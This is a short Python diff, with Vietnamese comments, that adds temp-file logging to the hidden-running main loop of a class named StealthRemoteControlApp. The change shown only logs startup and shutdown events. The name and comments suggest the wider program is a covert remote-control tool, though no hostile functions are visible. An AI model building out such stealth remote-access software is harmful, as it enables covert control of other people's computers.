@@ -662,10 +662,35 @@ class StealthRemoteControlApp:
 def main():
     """Hàm main chạy ẩn"""
     try:
+        # Log khởi động
+        try:
+            log_file = os.path.join(TEMP_DIR, "error.log")
+            os.makedirs(TEMP_DIR, exist_ok=True)
+            with open(log_file, 'a', encoding='utf-8') as f:
+                f.write(f"[{datetime.now()}] [STARTUP] Bắt đầu khởi động ứng dụng...\n")
+        except:
+            pass
+        
         app = StealthRemoteControlApp()
+        
+        # Log khởi tạo thành công
+        try:
+            log_file = os.path.join(TEMP_DIR, "error.log")
+            with open(log_file, 'a', encoding='utf-8') as f:
+                f.write(f"[{datetime.now()}] [STARTUP] Đã khởi tạo ứng dụng thành công\n")
+        except:
+            pass
         
         # Chạy vòng lặp vô hạn
         app.run_infinite_loop()
+    except KeyboardInterrupt:
+        # Log dừng do người dùng
+        try:
+            log_file = os.path.join(TEMP_DIR, "error.log")
+            with open(log_file, 'a', encoding='utf-8') as f:
+                f.write(f"[{datetime.now()}] [STOP] Ứng dụng dừng do người dùng (KeyboardInterrupt)\n")
+        except:
+            pass
     except Exception as e:
         # Ghi log lỗi nếu có
         try:
